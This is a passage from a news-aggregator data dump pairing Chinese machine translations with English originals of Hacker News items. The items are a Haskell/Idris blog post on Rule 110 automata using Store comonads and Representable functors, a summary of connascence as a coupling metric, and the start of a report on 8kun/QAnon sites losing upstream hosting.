n\u7684n\u7528\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u5e76\u88ab\u5f53\u4f5c\u51fd\u6570\u53c2\u6570\u5bf9\u5f85\u3002\n\u5927\u62ec\u53f7\u8868\u793a\u5b83\u662f\u4e00\u4e2a\u9690\u5f0f\u53c2\u6570\u3002\u8fd9\u610f\u5473\u7740\u7c7b\u578b\u68c0\u67e5\u5668\u80fd\u591f\u63a8\u65ad\u53c2\u6570\u7684\u503c\uff0c\u8c03\u7528\u8005\u6c38\u8fdc\u4e0d\u9700\u8981\u663e\u5f0f\u5730\u4f20\u5165\u503c\u3002\u8fd9\u53ef\u80fd\u770b\u8d77\u6765\u5f88\u795e\u5947\uff0c\u4f46\u5b83\u975e\u5e38\u7c7b\u4f3c\u4e8e\u60a8\u5728Haskell\u4e2d\u4e60\u60ef\u7684\u7c7b\u578b\u63a8\u65ad\u3002\n\u4f7f\u7528\u6b64REFACTABLE\u5b9e\u4f8b\uff0c\u7d22\u5f15\u7c7b\u578bFin n\u6c38\u8fdc\u4e0d\u80fd\u751f\u6210\u5927\u4e8en-1\u7684\u503c\uff0c\u5e76\u4e14\u51fd\u6570\u5668\u7684\u5927\u5c0f\u5fc5\u987b\u4e3an\u3002\u8fd9\u5728\u7f16\u8bd1\u65f6\u662f\u6709\u4fdd\u8bc1\u7684\u3002\n\u8fd9\u610f\u5473\u7740\u901a\u8fc7\u4e3an\u9009\u62e9\u4e00\u4e2a\u4e0d\u540c\u7684\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u4efb\u610f\u56fa\u5b9a\u957f\u5ea6\u7684\u5411\u91cf\u63d0\u4f9b\u4e00\u4e2a\u53ef\u8868\u793a\u7684\u5b9e\u4f8b\u3002\n\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u5207\u6362\u5230Idris\uff0c\u6211\u4eec\u9700\u8981\u91cd\u5199Store\u7c7b\u578b\u3002\u6211\u4eec\u8fd8\u9700\u8981\u4f7f\u5176\u4e0e\u53ef\u4ee3\u8868\u5408\u4f5c\uff1a\n\u6570\u636e\u5b58\u50a8\uff1a(\u7c7b\u578b-&gt;\u7c7b\u578b)-&&gt;\uff1b\u7c7b\u578b-&&gt;\uff1b\u7c7b\u578b-&&gt;\u7c7b\u578bMkStore\uff1arep-&gt\uff1bf a-&gt\uff1bStore f rep a\u3002\n\u8fd9\u4e2a\u7248\u672c\u7684Store\u5305\u542b\u6211\u4eec\u7684\u5f53\u524d\u7d22\u5f15(\u73b0\u5728\u79f0\u4e3arep)\u548c\u6211\u4eec\u53ef\u8868\u793a\u7684\u7c7b\u578bf a\u3002\u6211\u4eec\u4e0d\u518d\u6709\u67e5\u8be2\u51fd\u6570\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u5c06\u628a\u6211\u4eec\u7684\u72b6\u6001\u5b58\u50a8\u4e3aR\u4e2d\u7684\u6570\u636e\u3002\n.", "note_en": "After reading Chris Penner&#39;s blog post on  Conway&#39;s Game Of Life Using Representable and Comonads, I decided to implement a similar solution for the 1 dimensional automata  Rule 110. Being such a simple algorithm I thought the implementation would be trivial. However, it turns out that working with arbitarily bounded spaces in the  Store Comonad requires a clever use of dependent types to apply memoizaition as described in Chris&#39; blog.\n This blog post walks through my experience attempting to use  Store,  Representable in Haskell to implement Rule 110, difficulty finding a suitable  Representable instance, and then a pivot to Idris where I was able to solve the problem using the finite set type  Fin n.\n The Rule 110 algorithm takes a vector of boolean values and applies a simple set of rules for transforming each index based upon its neighbors. You can think of it as a 1 dimensional variant of Conway&#39;s Game of Life, but with the twist that the first and last element of the vector are considered neighbors. In other words, the automata in Rule 110 exists on a circle rather then a line segment.\n   This post assumes no prior knowledge of Comonads, Representable Functors,  Fin n. The first few sections are intended to introduce these concepts by focusing on the actual implementations of their APIs.\n  The  Store type can be thought of as a way to query some indexable state along with a cursor that queries into the store at some index.\n  State is held implicitly in your query function and, as we shall see later, can be transformed through composition.\n As an example, we can construct a  Store whose implicit state is an infinite list of Booleans which we index into with an Integer:\n initialStore ::  Store  Int  Bool  initialStore  =  Store query  0    where    query ::  Int  -&gt;  Bool   query i  = ( cycle [ True,  False])  !!  abs i\n The  Store API then allows us to do things like query arbitrary indices, shift around our cursor, and through its  Functor and  Comonad instances to perform transformations on the implicit state held inside the query function.\n     peek :: s  -&gt;  Store s a  -&gt; a  peek s ( Store query _)  = query s     peeks :: (s  -&gt; s)  -&gt;  Store s a  -&gt; a  peeks f ( Store query s)  = query (f s)\n peek disregards the current cursor and instead applies a new cursor to the store&#39;s query function.  peeks uses a function  s -&gt; s to modify the current cursor and then query the store with the new cursor.\n  seek :: s  -&gt;  Store s a  -&gt;  Store s a  seek s ( Store query _)  =  Store query s     seeks :: (s  -&gt; s)  -&gt;  Store s a  -&gt;  Store s a  seeks f ( Store query s)  =  Store query (f s)\n This covers are basic getters and setters, but what if we wanted a way to query multiple indices into our store?\n  peekMany :: [s]  -&gt;  Store s a  -&gt; [a]  peekMany xs store  =  fmap ( flip peek store) xs\n This function looks pretty good, but notice we are using  fmap. We can take advantage of polymorphism here allow use use of any  Functor:\n peekFunctor ::  Functor f  =&gt; f s  -&gt;  Store s a  -&gt; f a  peekFunctor fs store  =  fmap ( flip peek store) fs\n Now we can use any  Functor we want, but notice how we aren&#39;t using our cursor at all. This is a clue that we might be able to generalize this function further.\n It would be great if we could modify  peekFunctor to use our cursor value without losing the current behavior of the function.\n If we replace the  f s parameter with a function  s -&gt; f s then we could apply the current cursor to our function and generate an  f s to generate our  f a output. Then if we want the precise behavior of  peekFunctor we can simply apply  const (x :: f s) and ignore the current cursor!\n experiment ::  Functor f  =&gt; (s  -&gt; f s)  -&gt;  Store s a  -&gt; f a  experiment f store  =  fmap ( flip peek store) (f (pos store))\n  pos ::  Store s a  -&gt; a   peek :: s  -&gt;  Store s a  -&gt; a   peeks :: (s  -&gt; s)  Store s a  -&gt; a   seek :: s  -&gt;  Store s a  -&gt; a   seeks :: (s  -&gt; s)  Store s a  -&gt; a   experiment ::  Functor f  =&gt; (s  -&gt; f s)  -&gt;  Store s a  -&gt; f a\n  The state of the system is stored implicitely inside the  s -&gt; a query function rather then in some data structure. Because of this, the only way to modify the state would be to modify the query function itself.\n We can do this by first querying the current store to get an  a value and then apply some  a -&gt; b function to the value to produce a modified version of the state at that index.\n We can do this by pattern matching on our  Store then composing an  a -&gt; b function with our query function:\n updateStoreState :: (a  -&gt; b)  -&gt;  Store s a  -&gt;  Store s b  updateStoreState f ( Store query s)  =  Store (f  . query) s\n updateStoreState allows you to modify the query result for all possible values inside the Store&#39;s implicit state. This signature shoud look familiar as it is  fmap and  Store is in fact a  Functor.\n instance  Functor ( Store s)  where    fmap :: (a  -&gt; b)  -&gt;  Store s a  -&gt;  Store s b    fmap f ( Store query s)  =  Store (f  . query) s\n Now we can model successive transformations of the state through applications of  fmap. For example, using the  Store Int Bool example from earlier, we might want to apply  not :: Bool -&gt; Bool to invert the state of our system:\n initialStore ::  Store  Int  Bool  initialStore  =  Store query  0    where   query i  = ( cycle [ True,  False])  !! i     newState ::  Store  Int  Bool  newState  =  fmap  not initialStore\n  newState  =  fmap  not initialStore    =  fmap  not ( Store query s)    =  Store ( not  . query) s\n Using this technique to model 3 manipulations of a system shows how each modification to the implicit state builds up a larger composed query function:\n newState :: (a  -&gt; b)  -&gt; (b  -&gt; c)  -&gt; (c  -&gt; d)  -&gt;  Store s a  -&gt;  Store s b  newState h g f store  =  fmap f ( fmap g ( fmap h store))    =  fmap f ( fmap g ( fmap h ( Store query s)))    =  fmap f ( fmap g ( Store (h  . query) s))    =  fmap f ( Store (g  . h  . query) s)    =  Store (f  . g  . h  . query) s\n While elegant, modeling state transformations as function composition means that every time we query an index in a  Store, we must recalculate every single previous transformation going back to the original  Store query. Without caching these intermediate computations this will get very expensive.\n Luckily, Chris Penner showed us a fantastic solution for this using Representable Functors. We will look at  Representable shortly, but for now lets ignore the performance issue and focus on the tools we need to naively implement Rule 110.\n   Comonads are the dual of  Monads. Where  Monads introduce some effect to an argument via the form  a -&gt; m b,  Comonads introduce a notion of querying a structure for data (co-effects):\n -- Monadic  a  -&gt; m a   repeat  :: a  -&gt; [a]   -- Comonadic  w a  -&gt; a   length  :: [a]  -&gt;  Int\n  class  Functor w  =&gt;  Comonad w  where    extract :: w a  -&gt; a    duplicate :: w a  -&gt; w (w a)    extend :: (w a  -&gt; b)  -&gt; w a  -&gt; w b\n  extract :: w a  -&gt; a   return  :: a  -&gt; m a     duplicate :: w a  -&gt; w (w a)   join :: m (m a)  -&gt; m a     extend :: (w a  -&gt; b)  -&gt; w a  -&gt; w b   (=&lt;&lt;) :: (a  -&gt; m b)  -&gt; m a  -&gt; m b\n If a defining characteristic of  Comonads in Haskell is to provide a mechanism for querying some structure for data, then we can almost definitionally say that  Store is a  Comonad.  Store is literally a mechnanism for querying a structure to produce data!\n instance  Comonad ( Store s)  where    extract ::  Store s a  -&gt; a   extract ( Store query s)  = query s      extend :: ( Store s a  -&gt; b)  -&gt;  Store s a  -&gt;  Store s b   extend f ( Store query s)  =  Store (\\s&#39;  -&gt; f ( Store query s&#39;)) s\n extract applies the current cursor to the query function and  extend chains state transforming queries.\n extract is fairly trivial in this case, but  extend is a little trickier. It helps to think about in relation to our  fmap implementation.\n Like  fmap, it uses a function to modify our implicit state, but where  fmap composed a pure  a -&gt; b function with our query,  extend creates a new query function by applying your entire store to a comonadic action. This allows us to bring into scope the entire current store when modifying particular points in the store.\n extend is extremely powerful and allows us to do really interesting things like create windowing functions and perform kernel convolution. It allows us to modify every single individual points in &#34;parallel&#34; using the entire state as context.\n One interesting example of extend is to perform a moving average on some time series data.\n First we need a  Store modeling time sequenced data. We will use  Int for our Index and it will represent a single unit of time in a data stream. We want some fairly dynamic data source so I chose the Fibbonaci sequence. At each point in time (each index) we get the next Fibbonaci number.\n fibStore ::  Store  Int  Int  fibStore  = store query  0    where    query ::  Int  -&gt;  Int   query  0  =  0   query  1  =  1   query n  = query (n  -  1)  + query (n  -  2)\n Now, if we want to calculate a window starting from a given cursor want some way to query for the subsequent points in time.  experiement will work perfectly here:\n   Now notice the shape of  window is  Store Int a -&gt; [a]. That looks a lot like the comonadic action for  extend:  Store s a -&gt; b. We can use  extend to apply  window over the enter store:\n  Now if we  peek at any index in the store we see a window of the subsequent Fibonacci numbers!\n   With the tools now available to us, we can make a first attempt at our Rule 110 algorithm.\n  type  Index  =  Int     initializeStore :: [ Bool]  -&gt;  Store  Index  Bool  initializeStore xs  =  Store query  0    where    query ::  Index  -&gt;  Bool   query i  = xs  !! i\n We are modeling our initial state as a list and using an unsafe list lookup function for our query. This isn&#39;t ideal, but we are just trying to put together a rough draft.\n Next we need a way to query an index and its neighbors. Just like our windowing function, we can use  experiment here.\n  _lookupIndices is a type hole we need to fill. By starting from  neighborValues we let GHC tell us what shape we need for  lookupIndices:\n    But which accounts for the fact that our automata lives on a circle not a line. We need to be able to identify the first and last index and use that information to select the correct neighbors.\n The first, simplest solution is to pass in the length of the list as a value:\n type  Index  =  Int   type  Size  =  Int     lookupIndices ::  Size  -&gt;  Index  -&gt; [ Index]  lookupIndices size i    | i  ==  0  = [size  -  1,  0,  1]    | i  == size  - 1  = [i  -  1, i,  0]    |  otherwise  = [i  -  1, i, i  +  1]     neighbors ::  Size  -&gt;  Store  Int  Bool  -&gt; [ Bool]  neighbors size  = experiment (lookupIndices size)\n With a mechanism to lookup the state for our index and its neighbors, we next need to use that information to calculate the next state of at our index. We can do this by casing on the output of  neighborValues:\n Now we need to case on the state of the neighbors and apply our rubric to determine the new state at our index:\n newState ::  Size  -&gt;  Store  Index  Bool  -&gt;  Bool  newState size store  =    case neighbors size store  of   [ False,  False,  False]  -&gt;  False   [ True,  False,  False]  -&gt;  False   [ True,  True,  True]  -&gt;  False   _  -&gt;  True\n Lastly, we need a way to apply this transformation to the entire store to create the next generation of the automata.  extend to the rescue!\n nextGen ::  Size  -&gt;  Store  Index  Bool  -&gt;  Store  Index  Bool  nextGen size  = extend (newState size)\n Lets use equational reasoning to take a closer look at what happens when you call  nextGen:\n nextGen size store  = extend (newState size) store    = extend (newState size) ( Store query s)    =  Store (\\s&#39;  -&gt; (newState size) ( Store query s&#39;)) s\n  nextGen size (nextGen size store)  = extend (newState size) (extend (newState size) store)    = extend (newState size) (extend (newState size) ( Store query s))    = extend (newState size) ( Store (\\s&#39;  -&gt; (newState size) ( Store query s&#39;)) s)    =  Store (\\s&#39;&#39;  -&gt; (newState size) ( Store (\\s&#39;  -&gt; (newState size) ( Store query s&#39;)) s&#39;&#39;)) s\n Its a little hard to grok, but if you squint your eyes a bit you can see that we are building up our  query function by chaining calls of  newState on the store. So whenever you query an index, the composed query function will apply  newState a bunch of times to your store.\n The last step to a working implementation is a function to view a store as a list. This isn&#39;t really a part of the algorithm per se, but we do want a way to view our results!\n viewStore ::  Size  -&gt;  Store  Index  Bool  -&gt; [ Bool]  viewStore size store  = experiment ( const [ 0 ..size]) store\n To run the simulation we can use a recursive function in  IO to repeatedely print the result of  viewStore and then call  nextGen to update the state:\n runSimulation ::  Size  -&gt;  Store  Index  Bool  -&gt;  IO ()  runSimulation size store  =  do    print  $ viewStore size store   runSimulation size  $ nextGen size store\n This implementation does work, but if you try running it you will see that it has major performance issue. Extending a new generation means growing a chain of calls to  newState.\n This ever growing query function has to be calculated in full every time you peek into an index. We do that for every index at every generation when we call  runSimulation.\n Its actually worse then that though! To calculate the new state at each index we also have to peek at its neighbors. So that means for every index we are repeating the same huge query 3 times!\n   A  Functor  f is representable if it has a corresponding type  Rep f that indexes  f completely. There must be a valid index into  f for every value of  Rep f and at the same time we must be able to construct a container where each element in the container is produced from its  Rep f index.\n Another more formal way of stating this is that there must exist an isomorphism between  f a and  Rep f -&gt; a. This isomorphism is witnessed by the  tabulate and  index functions from the  Representable typeclass:\n class  Functor f  =&gt;  Representable f  where    type  Rep  f ::  *    tabulate :: ( Rep f  -&gt; a)  -&gt; f a    index :: f a  -&gt; ( Rep f  -&gt; a)\n It&#39;s hard to see exactly how this would be useful to us, but there is a clever trick we can play with  Representable to get memoization &#39;for free.&#39;\n tabulate will takes some function that produces  a values from  Rep f values and then constructors a  Representable f containing an  a value for every possible  Rep f value.\n index lets you use a  Rep f to query a  Representable f for  a values. One nice property of  Representable is that if you have a lawful instance then  index must be a safe function without the need for  Maybe!\n  The most obvious first choice for  Functor is  [], but what would we use for  Rep f?  Int doesn&#39;t work because you can&#39;t have a negative index into  [].  Nat almost works, but then what happes if the list is empty? Unfortunately there is no  Representable instance for  [].\n NonEmpty solves those problems, but it is still possible to have a  NonEmpty without an element for every  Nat.\n  newtype  Stream a  =  Cons a ( Strema a)   data  Nat  =  Z  |  S  Nat     instance  Functor  Stream  where    fmap :: (a  -&gt; b)  -&gt;  Stream a  -&gt;  Stream b    fmap f ( Stream a as)  =  Cons (f a) ( fmap f as)     instance  Representable  Stream  where    type  Rep f  =  Nat      tabulate :: ( Nat  -&gt; a)  -&gt;  Stream a   tabulate f  =  Cons (f  Z) (tabulate (f  .  S))      index ::  Stream a  -&gt;  Nat  -&gt; a    index ( Cons a as)  Z  = a    index ( Cons _ as) ( S n)  =  index as n\n  data  Identity a  =  Identity a     instance  Functor  Identity  where    fmap f ( Identity a)  =  Identity (f a)     instance  Representable  Identity  where    type  Rep f  = ()      tabulate :: (()  -&gt; a)  -&gt;  Identity a   tabulate f  =  Identity  $ f ()      index ::  Identity a  -&gt; ()  -&gt; a    index ( Identity a) ()  = a\n Since  Identity can only hold a single  a and  () is inhabited by a single value, this instance lawful and total. :)\n If our  Store had a single element  Identity would be perfect to represent queries into it and likewise, if it had an infinite amount of elements  Stream might be perfect. However, we are looking for something in between.\n What we need is some sort of bounded data structure, but in order to make it  Representable we also need a corresponding bounded indexing type  Rep f.  Identity and  () is a great example of a such a bounded  Representable, but its bound at a fixed size of 1 element. We would like some  Functor f and  Rep f where we can fix the bound at whatever size we wish.\n Another way of saying this is that we want is a family of  Representable functors and a family of corresponding  Rep f types, one pairing for each possible size boundary.\n We can do this using  Vect n a and  Fin n a.  Vect is a fixed length vector whose length is encoded with a type level  Nat.  Fin is a finite natural whose maximum value is encoded with a type level  Nat.\n data  Vect ( n ::  Nat) a  where    VNil  ::  Vect  Z a    VCons  :: a  -&gt;  Vect n a  -&gt;  Vect ( S n) a     data  Fin ( n ::  Nat)  where    FZ  ::  Fin ( S n)    FS  ::  Fin n  -&gt;  Fin ( S n)\n And like that, we have entered the world of dependent types. A world very messy and confusing in Haskell. It is now time to switch over to Idris, but don&#39;t worry all the implementations up to this point are identical modulo a few small syntax changes.\n  interface  Functor f  =&gt;  Representable (f  :  Type  -&gt;  Type) (rep  :  Type)  | f  where    tabulate  : (rep  -&gt; a)  -&gt; f a    index  : f a  -&gt; rep  -&gt; a     Representable ( Vect n) ( Fin n)  where   tabulate f {n  =  Z}  = []   tabulate f {n  = ( S k)}  = f  FZ  :: tabulate (f  .  FS)   index (x  ::  _)  FZ {n  = ( S k)}  = x   index ( _  :: xs) ( FS x) {n  = ( S k)}  = index xs x\n In Idris there is no distinction between the &#34;type level&#34; and &#34;term level.&#34; Types are first class values that can be passed around and worked with like any other values.\n Correspondingly, type parameters (such as the  n in  Vect n (Fin n) are the same as term level parameters and can be passed into functions and pattern matched on. You can see this in the definition of  tabulate above where the  n from  Vect n is wrapped in curly braces and treated like a function parameter.\n The curly braces indicate that it is an implict parameter. This means that the typechecker is able to infer the value of the parameter and the caller never has to explicitely pass a value in. This might seem like magic, but its very similar to the type inference you are used to with Haskell.\n With this instance of  Representable, the indexing type  Fin n cannot ever produce a value greater then  n - 1 and the  Functor must be of size  n. This is guaranteed at compile time.\n This means that by choosing a different value for  n, we can have a  Representable instance for an arbitrary fixed length vector.\n  Now that we have switched over to Idris we need to rewrite our  Store type. We also need to make it to work with  Representable:\n data  Store  : ( Type  -&gt;  Type)  -&gt;  Type  -&gt;  Type  -&gt;  Type  where    MkStore  : rep  -&gt; f a  -&gt;  Store f rep a\n This version of  Store contains our current index (now called  rep) and our  Representable type  f a. We no longer have a query function. Instead we are going to store our state as data in the  R\n......", "posttime": "2020-10-19 13:52:16", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "comonad,automata,store", "title": "\u5177\u6709Comonad\u3001\u53ef\u8868\u793a\u51fd\u5b50\u548c\u4f9d\u8d56\u7c7b\u578b\u7684\u5143\u80de\u81ea\u52a8\u673a", "title_en": "Cellular Automata with Comonads, Representable Functors, and Dependent Types", "transed": 1, "url": "https://blog.cofree.coffee/2020-10-17-bounded-space-automata/", "via": "", "real_tags": ["comonad", "automata", "store"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029711, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6240\u6709\u4ee3\u7801\u53ef\u80fd\u4f1a\u66f4\u6539\u3002\u968f\u7740\u73b0\u5b9e\u4e16\u754c\u7684\u53d8\u5316\uff0c\u6211\u4eec\u7684\u4ee3\u7801\u4e5f\u5fc5\u987b\u6539\u53d8\u3002\u5728\u6211\u4eec\u7f16\u5199\u4ee3\u7801\u65f6\uff0cConnascence\u8ba9\u6211\u4eec\u6df1\u5165\u4e86\u89e3\u4ee3\u7801\u5bf9\u7075\u6d3b\u6027\u7684\u957f\u671f\u5f71\u54cd\u3002\u7ef4\u62a4\u7075\u6d3b\u7684\u4ee3\u7801\u5e93\u5bf9\u4e8e\u4fdd\u6301\u957f\u671f\u5f00\u53d1\u901f\u5ea6\u81f3\u5173\u91cd\u8981\u3002\n\u4e00\u81f4\u6027\u662f\u4e00\u79cd\u5ea6\u91cf\uff0c\u548c\u6240\u6709\u5ea6\u91cf\u4e00\u6837\uff0c\u5b83\u4e5f\u662f\u4e00\u79cd\u4e0d\u5b8c\u7f8e\u7684\u5ea6\u91cf\u3002\u4f46\u662f\uff0cConnascence\u91c7\u7528\u66f4\u5168\u9762\u7684\u65b9\u6cd5\uff0c\u5176\u4e2d\u5fc5\u987b\u5728\u4e09\u4e2a\u4e0d\u540c\u7684\u8f74\u4e0a\u8003\u8651\u4ee3\u7801\u5e93\u4e2d\u7684\u6bcf\u4e2aConnascence\u5b9e\u4f8b\uff1a\n\u7a0b\u5ea6\u3002\u4e00\u4e2a\u4e0e\u6570\u4ee5\u5343\u8ba1\u7684\u5176\u4ed6\u5b9e\u4f53\u5171\u8c0b\u7684\u5b9e\u4f53\uff0c\u53ef\u80fd\u6bd4\u4e00\u4e2a\u53ea\u4e0e\u5c11\u6570\u51e0\u4e2a\u5b9e\u4f53\u5171\u8c0b\u7684\u5b9e\u4f53\u66f4\u6709\u53ef\u80fd\u662f\u4e00\u4e2a\u66f4\u5927\u7684\u95ee\u9898\u3002\n\u5730\u70b9\u3002\u4ee3\u7801\u5e93\u4e2d\u7d27\u5bc6\u76f8\u8fde\u7684\u65b0\u5143\u7d20\u6bd4\u76f8\u8ddd\u8f83\u8fdc\u7684\u5143\u7d20\u8981\u597d\u3002\n\u5f3a\u5ea6\u3001\u5ea6\u6570\u548c\u5c40\u90e8\u6027\u8fd9\u4e09\u4e2a\u5c5e\u6027\u4e3a\u7a0b\u5e8f\u5458\u63d0\u4f9b\u4e86\u4ed6\u4eec\u9700\u8981\u7684\u6240\u6709\u5de5\u5177\uff0c\u4ee5\u4fbf\u505a\u51fa\u660e\u667a\u7684\u51b3\u5b9a\uff0c\u51b3\u5b9a\u4f55\u65f6\u5141\u8bb8\u67d0\u4e9b\u7c7b\u578b\u7684\u8026\u5408\uff0c\u4ee5\u53ca\u4f55\u65f6\u5e94\u8be5\u91cd\u6784\u4ee3\u7801\u3002\n\u53ef\u4ee5\u8bf4\uff0cConnascence\u6700\u91cd\u8981\u7684\u597d\u5904\u4e4b\u4e00\u662f\u5b83\u4e3a\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u4e86\u8c08\u8bba\u4e0d\u540c\u7c7b\u578b\u8026\u5408\u7684\u8bcd\u6c47\u8868\u3002Connascence\u5c06\u8bb8\u591a\u7ecf\u9a8c\u4e30\u5bcc\u7684\u5de5\u7a0b\u5e08\u901a\u8fc7\u8bd5\u9a8c\u548c\u9519\u8bef\u5b66\u5230\u7684\u4e1c\u897f\u8fdb\u884c\u4e86\u7f16\u7801\uff1a\u62e5\u6709\u4e00\u7ec4\u901a\u7528\u7684\u540d\u8bcd\u6765\u8868\u793a\u4e0d\u540c\u7c7b\u578b\u7684\u8026\u5408\u4f7f\u6211\u4eec\u80fd\u591f\u66f4\u5bb9\u6613\u5730\u5206\u4eab\u7ecf\u9a8c\u3002", "note_en": "All code is subject to change. As the real world changes, so too must our code. Connascence gives us an insight into the long-term impact our code will have on flexibility, as we write it. Maintaining a flexible codebase is essential for maintaining long-term development velocity.\n    Connascence is a metric, and like all metrics is an imperfect measure. However, connascence takes a more holistic approach, where each instance of connascence in a codebase must be considered on three separate axes:\n  Degree. An entity that is connascent with thousands of other entities is likely to be a larger issue than one that is connascent with only a few.\n  Locality. Connascent elements that are close together in a codebase are better than ones that are far apart.\n  The three properties of Strength, Degree, and Locality give the programmer all the tools they need in order to make informed decisions about when they will permit certain types of coupling, and when the code ought to be refactored.\n    Arguably one of the most important benefits of connascence is that it gives developers a vocabulary to talk about different types of coupling. Connascence codifies what many experienced engineers have learned by trial and error: Having a common set of nouns to refer to different types of coupling allows us to share that experience more easily.", "posttime": "2020-10-19 13:52:07", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8f6f\u4ef6,\u8026\u5408,software,\u4ee3\u7801", "title": "\u8fde\u8d2f\u6027\uff1a\u8026\u5408\u7c7b\u578b\u7684\u8f6f\u4ef6\u8d28\u91cf\u5ea6\u91cf\u548c\u5206\u7c7b", "title_en": "Connascence: A software quality metric and a taxonomy for types of coupling", "transed": 1, "url": "https://connascence.io/", "via": "", "real_tags": ["\u8f6f\u4ef6", "\u8026\u5408", "software", "\u4ee3\u7801"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029710, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5468\u65e5\u665a\u4e0a\u7ed9\u4fc4\u52d2\u5188\u5dde\u4e00\u5bb6\u4e92\u8054\u7f51\u63d0\u4f9b\u5546\u6253\u4e86\u4e00\u4e2a\u7535\u8bdd\uff0c\u5c31\u53ef\u4ee5\u77ed\u6682\u5730\u5c06\u4e0e8chan/8kun-\u4e00\u4e2a\u4e0e\u51e0\u8d77\u5927\u89c4\u6a21\u67aa\u51fb\u4e8b\u4ef6\u6709\u5173\u7684\u6709\u4e89\u8bae\u7684\u5728\u7ebf\u56fe\u7247\u677f-\u4ee5\u53ca\u6781\u53f3\u7ffc\u9634\u8c0b\u8bbaQAnon\u6709\u5173\u7684\u591a\u4e2a\u7f51\u7ad9\u6682\u65f6\u6401\u7f6e\u4e00\u8fb9\u3002QAnon\u8ba4\u4e3a\uff0c\u6492\u65e6\u604b\u7ae5\u7656\u8005\u7684\u9634\u8c0b\u6b63\u5728\u8fd0\u8425\u4e00\u4e2a\u5168\u7403\u513f\u7ae5\u6027\u8d29\u5356\u56e2\u4f19\uff0c\u5e76\u5bc6\u8c0b\u53cd\u5bf9\u5510\u7eb3\u5fb7\u00b7\u7279\u6717\u666e(Donald Trump)\u603b\u7edf\u3002\u5728\u77ed\u6682\u7684\u4e2d\u65ad\u4e4b\u540e\uff0c\u8fd9\u4e9b\u7f51\u7ad9\u5728\u4fc4\u7f57\u65af\u5723\u5f7c\u5f97\u5821\u7684\u4e00\u5bb6\u4e92\u8054\u7f51\u516c\u53f8\u7684\u5e2e\u52a9\u4e0b\u91cd\u65b0\u4e0a\u7ebf\u3002\n\u5927\u91cf\u76848kun\u548cqanon\u76f8\u5173\u7f51\u7ad9(\u89c1\u4e0a\u56fe)\u901a\u8fc7\u534e\u76db\u987f\u5dde\u6e29\u54e5\u534e\u7684\u4e00\u5bb6\u4e92\u8054\u7f51\u63d0\u4f9b\u5546\u8fde\u63a5\u5230\u7f51\u7edc\u3002\u540d\u4e3aVanwaTech(\u4e5f\u79f0\u4e3a\u3002\u201cOrcaTech\u201d)\u3002\u6b64\u524d\u4e07\u534e\u79d1\u6280\u8981\u6c42\u5207\u65ad\u8fd9\u4e9b\u7f51\u7ad9\u7684\u547c\u5401\u90fd\u88ab\u7f6e\u82e5\u7f54\u95fb\uff0c\u636e\u62a5\u9053\uff0c\u8be5\u516c\u53f8\u7684\u6240\u6709\u8005\u5c3c\u514b\u00b7\u6797(Nick Lim)\u4e00\u76f4\u5728\u4e0e8kun\u7684\u7ba1\u7406\u5458\u5408\u4f5c\uff0c\u4ee5\u4fdd\u62a4\u8a00\u8bba\u81ea\u7531\u7684\u540d\u4e49\u8ba9\u8fd9\u4e9b\u7f51\u7ad9\u4fdd\u6301\u5728\u7ebf\u3002\n\u4f46VanwaTech\u4e5f\u6709\u4e00\u4e2a\u5355\u70b9\u6545\u969c\uff1a\u4e3a\u5404\u79cd8kun/QAnon\u7f51\u7ad9\u670d\u52a1\u7684\u4e92\u8054\u7f51\u5730\u5740\u5e26\u53d7\u5230\u4fdd\u62a4\uff0c\u4ee5\u514d\u53d7\u5230\u4fc4\u52d2\u5188\u5dde\u5e0c\u5c14\u65af\u4f2f\u52d2(Hillsboro)\u7684\u4e25\u91cd\u548c\u6301\u7eed\u7684\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1(DDoS)\u653b\u51fb\u3002\u57fa\u4e8eCNServers LLC\u3002\n\u5468\u65e5\u665a\u4e0a\uff0c\u5b89\u5168\u7814\u7a76\u5458\u7f57\u6069\u00b7\u5409\u5c14\u6885\u7279(Ron Guilmette)\u7ed9CNServers\u7684\u6240\u6709\u8005\u6253\u4e86\u4e00\u4e2a\u7535\u8bdd\uff0c\u540e\u8005\u58f0\u79f0\u5bf9\u4ed6\u7684\u516c\u53f8\u5e2e\u52a9QAnon\u548c8kun\u4fdd\u6301\u7167\u660e\u7684\u7206\u6599\u611f\u5230\u9707\u60ca\u3002\n\u5728\u90a3\u901a\u7535\u8bdd\u51e0\u5206\u949f\u540e\uff0cCNServers\u544a\u8bc9\u5176\u5ba2\u6237-\u5728\u5317\u7231\u5c14\u5170\u8d1d\u5c14\u6cd5\u65af\u7279\u6ce8\u518c\u7684Spartan Host Ltd.-\u5b83\u5c06\u4e0d\u518d\u4e3aSpartan 